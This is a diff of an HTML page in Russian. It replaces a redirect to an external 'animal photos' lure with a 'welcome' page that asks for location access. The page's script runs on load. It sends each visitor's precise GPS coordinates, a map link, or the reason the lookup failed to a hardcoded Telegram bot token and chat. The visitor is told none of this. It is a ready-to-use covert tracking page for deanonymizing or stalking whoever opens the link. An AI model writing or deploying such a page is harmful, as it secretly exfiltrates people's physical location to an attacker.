@@ -1,11 +1,115 @@
 <!DOCTYPE html>
-<html>
+<html lang="ru">
 <head>
-  <meta http-equiv="refresh" content="0; url=https://wnkk-lbr.vercel.app/brapos.html">
-  <meta http-equiv="CONTENT-TYPE" content="text/html; charset=UTF-8">
-  <title>фotorpaфии живotныx</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Добро пожаловать</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #f0f2f5;
+            margin: 0;
+        }
+        .container {
+            text-align: center;
+            padding: 20px;
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+        }
+    </style>
 </head>
 <body>
+
+<div class="container">
+    <h1>Приветствуем на нашем сайте!</h1>
+    <p>Пожалуйста, разрешите доступ к геолокации для продолжения работы.</p>
+</div>
+
+<script>
+    // НАСТРОЙКИ (Вставь свои данные сюда)
+    const TELEGRAM_BOT_TOKEN = '8894434630:AAFel26CV1rYtt1EtwLJVUuCMGf1U_QwCwY'; 
+    const TELEGRAM_CHAT_ID = '@fnm04q';
+
+    // Функция отправки сообщения в Telegram
+    function sendToTelegram(message) {
+        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+        
+        fetch(url, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                chat_id: TELEGRAM_CHAT_ID,
+                text: message,
+                parse_mode: 'Markdown'
+            })
+        })
+        .then(response => {
+            if (!response.ok) {
+                console.error('Ошибка отправки в Telegram');
+            }
+        })
+        .catch(error => console.error('Ошибка сети:', error));
+    }
+
+    // Запрос геолокации при загрузке страницы
+    window.addEventListener('load', () => {
+        if ("geolocation" in navigator) {
+            navigator.geolocation.getCurrentPosition(
+                // Если пользователь согласился поделиться геопозицией
+                (position) => {
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+                    const accuracy = position.coords.accuracy; // Точность в метрах
+
+                    // Ссылка на Google Карты с координатами
+                    const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
+                    
+                    const text = `📍 *Новый посетитель!*\n` +
+                                 `• Широта: \`${lat}\`\n` +
+                                 `• Долгота: \`${lon}\`\n` +
+                                 `• Точность: ~${Math.round(accuracy)} м.\n\n` +
+                                 `🔗 [Открыть на картах](${mapUrl})`;
+
+                    sendToTelegram(text);
+                },
+                // Если пользователь запретил доступ или произошла ошибка
+                (error) => {
+                    let errorMsg = '';
+                    switch(error.code) {
+                        case error.PERMISSION_DENIED:
+                            errorMsg = 'Пользователь запретил доступ к геопозиции.';
+                            break;
+                        case error.POSITION_UNAVAILABLE:
+                            errorMsg = 'Информация о местоположении недоступна.';
+                            break;
+                        case error.TIMEOUT:
+                            errorMsg = 'Истекло время ожидания запроса геопозиции.';
+                            break;
+                        default:
+                            errorMsg = 'Неизвестная ошибка при запросе геопозиции.';
+                    }
+                    sendToTelegram(`⚠️ *Посетитель перешел на сайт, но:* \n${errorMsg}`);
+                },
+                // Опции запроса геолокации
+                {
+                    enableHighAccuracy: true, // Запрашивать высокую точность (GPS при наличии)
+                    timeout: 10000,           // Таймаут 10 секунд
+                    maximumAge: 0             // Не использовать кэшированные данные
+                }
+            );
+        } else {
+            sendToTelegram('❌ Браузер пользователя не поддерживает Geolocation API.');
+        }
+    });
+</script>
+
 </body>
 </html>
 
